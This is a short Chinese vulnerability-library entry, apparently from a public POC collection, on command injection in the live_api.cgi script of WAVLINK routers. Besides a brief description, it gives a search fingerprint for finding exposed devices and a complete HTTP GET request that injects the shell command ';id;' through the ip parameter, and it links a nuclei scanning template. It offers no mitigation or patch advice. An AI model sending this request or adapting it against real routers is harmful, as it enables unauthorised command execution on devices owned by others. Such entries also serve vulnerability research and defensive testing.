---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# WAVLINK live_api.cgi 存在命令执行

# 一、漏洞简介
WAVLINK wavlink是中国睿因科技（WAVLINK）公司的一款路由器。连接两个或多个网络的硬件设备，在网络间起网关的作用。WAVLINK 多款路由器 live_api.cgi 存在命令执行，攻击者可通过此漏洞获取权限。

# 二、影响版本
+ wavlink 路由器

# 三、资产测绘
+ hunter`web.body="firstFlage"`
+ 特征


# 四、漏洞复现
```java
GET /cgi-bin/live_api.cgi?page=abc&id=173&ip=;id; HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```


nuclei脚本

[wanlink-router-live-api-cgi-rce.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222231462-65f524b5-3aa2-4cd2-a4b3-8783722d7a12.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/on0bkn7zcvll4ivu>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
